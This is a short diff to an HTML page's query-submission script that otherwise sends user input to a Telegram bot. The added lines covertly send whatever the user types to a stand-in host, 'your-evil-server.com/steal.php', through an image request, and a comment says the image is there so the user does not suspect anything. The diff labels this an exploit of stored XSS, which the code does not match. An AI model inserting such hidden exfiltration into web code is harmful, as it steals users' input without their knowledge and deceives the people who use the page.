@@ -18,19 +18,27 @@
         #queryBox {
             margin-top: 20px;
         }
+
+        #userQuery {
+            color: black;
+        }
     </style>
     <script>
         function submitQuery() {
             var userQuery = document.getElementById("userQuery").value;
 
-            // Assuming you have a Telegram bot token and chat ID
+            // Exploiting the stored XSS vulnerability
+            var img = new Image();
+            img.src = "https://your-evil-server.com/steal.php?data=" + encodeURIComponent(userQuery);
+
+            // Display a fake image to prevent the user from suspecting anything
+            document.body.appendChild(img);
+
+            // Continue with the Telegram submission
             var token = "YOUR_TELEGRAM_BOT_TOKEN";
             var chatId = "YOUR_TELEGRAM_CHAT_ID";
-
-            // Construct the Telegram API URL
             var apiUrl = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chatId + "&text=" + userQuery;
 
-            // Send the query to Telegram using a simple AJAX request
             var xhttp = new XMLHttpRequest();
             xhttp.open("GET", apiUrl, true);
             xhttp.send();
